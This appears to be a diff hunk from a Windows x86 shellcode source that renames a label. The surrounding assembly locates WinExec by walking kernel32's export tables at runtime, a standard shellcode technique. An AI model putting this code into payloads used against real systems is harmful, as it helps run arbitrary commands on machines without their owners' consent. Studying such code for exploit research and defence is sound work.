@@ -35,11 +35,11 @@ BITS 32
 ; Found export names table (ESI)
     MOV     ECX, [EDI + EBX + 0x24]     ; ECX = [kernel32 + offset(export table) + 0x20] = offset(ordinals table)
 ; Found export ordinals table offset (ECX)
-find_winexec:
+find_winexec_x86:
     INC     EDX                         ; EDX = function number + 1
     LODSD                               ; EAX = &(names table[function number]) = offset(function name)
     CMP     [EDI + EAX], DWORD B2DW('W', 'i', 'n', 'E') ; *(DWORD*)(function name) == "WinE" ?
-    JNE     find_winexec                ;
+    JNE     find_winexec_x86            ;
 ; Found WinExec ordinal (EDX)
     LEA     EDX, [ECX + EDX * 2 - 2]    ; EDX = offset(ordinals table) + (WinExec function number + 1) * 2 - 2 = offset(WinExec function ordinal)
     MOVZX   EDX, WORD [EDI + EDX]       ; EDX = [kernel32 + offset(WinExec function ordinal)] = WinExec function ordinal
